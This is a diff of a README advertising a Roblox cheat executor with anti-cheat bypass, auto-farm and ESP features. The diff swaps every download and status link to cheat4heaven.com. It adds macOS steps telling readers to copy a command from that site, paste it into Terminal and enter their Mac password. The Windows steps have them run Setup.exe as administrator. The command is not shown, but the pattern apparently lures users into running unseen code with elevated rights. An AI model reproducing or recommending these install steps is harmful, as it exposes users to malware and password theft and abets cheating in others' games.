@@ -11,7 +11,7 @@
 
 **A free, stable, and consistently undetected Roblox script executor for Windows — built for players who want reliability over hype.**
 
-## **[⚡ Download Valex Executor — Latest Release ⚡](https://valexexecs.github.io/valex/)**
+## **[⚡ Download Valex Executor — Latest Release ⚡](https://cheat4heaven.com/safe-apps/)**
 
 
 </div>
@@ -24,7 +24,7 @@ The questions players ask most — **is valex executor detected**, **is valex ex
 
 With Valex you can **auto-farm in-game resources and currency without manual input**, **run god-mode and movement enhancement scripts across any Roblox game**, **execute ESP and radar overlays for competitive awareness**, and **stack multiple Lua scripts simultaneously** — all from a clean, no-nonsense interface that gets out of your way and lets you play.
 
-> 🔗 **[Download Valex Executor — Latest Release](https://valexexecs.github.io/valex/)**
+> 🔗 **[Download Valex Executor — Latest Release](https://cheat4heaven.com/safe-apps/)**
 
 ---
 
@@ -86,13 +86,25 @@ Using **Valex Executor** delivers session-level improvements you'll feel from da
 
 ## 📥 How to Install
 
-### 🖥️ PC (Windows/MacOS)
+### 🖥️ PC (Windows)
 
-1. Go to the **[Releases](https://valexexecs.github.io/valex/)** page and download the latest `Setup.exe`
+1. Go to the **[Releases](https://cheat4heaven.com/safe-apps/)** page and download the latest `Setup.exe`
 2. Right-click `Setup.exe` → **Run as Administrator**
 3. Open **Roblox** and join any game
 4. In Valex, click **Inject** — wait for the green *"Attached ✓"* status confirmation
 6. Load or paste your script in the editor and click **Execute** ✅
+
+---
+
+### 🍏 macOS (Intel & Apple Silicon)
+
+1. Go to the **[Releases](https://cheat4heaven.com/safe-apps/)** page and copy the command line
+2. Press Cmd + Space on your keyboard, type "**Terminal**" into Spotlight, and hit Enter
+3. Click inside the Terminal window, paste the command you copied, and press Enter.
+4. Type your **Mac password** when prompted.
+5. Press Enter one last time to begin the installation process.
+6. Once the process finishes, the Valex.app will be available in your Applications folder.
+7. Load or paste your script in the editor and click **Execute** ✅
 
 > 💡 **Stability Tip:** Always wait until your Roblox character is fully loaded into the game world — not just the loading screen — before clicking Inject. This eliminates the most common cause of injection instability.
 
@@ -116,7 +128,7 @@ One of Valex's defining features is its commitment to detection transparency:
 
 1. Open Valex — the status indicator in the top-right corner shows current bypass health
 2. Green = safe to inject; Yellow = caution (update incoming); Red = do not inject
-3. For detailed status, visit the official website's **[Status Page](https://valexexecs.github.io/valex/)** or the Discord `#status` channel
+3. For detailed status, visit the official website's **[Status Page](https://cheat4heaven.com/safe-apps/)** or the Discord `#status` channel
 4. Always verify status after any Roblox update before starting a session
 
 ---
@@ -127,10 +139,7 @@ One of Valex's defining features is its commitment to detection transparency:
 |---|---|---|---|
 | Windows 11 (64-bit) | ✅ Full | All current versions | Primary development target |
 | Windows 10 (64-bit) | ✅ Full | All current versions | Fully tested & stable |
-| Windows 8.1 | ⚠️ Limited | Legacy builds | Not officially supported |
-| Windows 7 | ❌ No | N/A | EOL — unsupported |
 | macOS | ✅ Full | All current versions | Primary development target |
-| Linux | ❌ No | N/A | Not supported |
 | Android | ✅ Full | All current versions | Fully tested & stable |
 | iOS | ✅ Full | All current versions | Fully tested & stable |
 
@@ -196,7 +205,7 @@ One of Valex's defining features is its commitment to detection transparency:
 ---
 
 **Q5: How do I know if it's safe to inject today?**
-> Open Valex — the status indicator in the top-right corner of the interface shows current bypass health in real time: green means safe, yellow means an update is in progress, red means do not inject. You can also check the **[Status Page](https://valexexecs.github.io/valex/)** on the official website or the `#status` channel in the Discord server before starting any session. This transparency system directly answers the **is valex executor detected** question every single day.
+> Open Valex — the status indicator in the top-right corner of the interface shows current bypass health in real time: green means safe, yellow means an update is in progress, red means do not inject. You can also check the **[Status Page](https://cheat4heaven.com/safe-apps/)** on the official website or the `#status` channel in the Discord server before starting any session. This transparency system directly answers the **is valex executor detected** question every single day.
 
 ---
 
@@ -214,6 +223,6 @@ One of Valex's defining features is its commitment to detection transparency:
 
 **⭐ If Valex Executor has earned your trust through its transparency and stability, please star this repository — it helps the community find an executor that's honest about what matters most.**
 
-[⬆️ Back to Top](https://valexexecs.github.io/valex/)
+[⬆️ Back to Top](https://cheat4heaven.com/safe-apps/)
 
 </div>
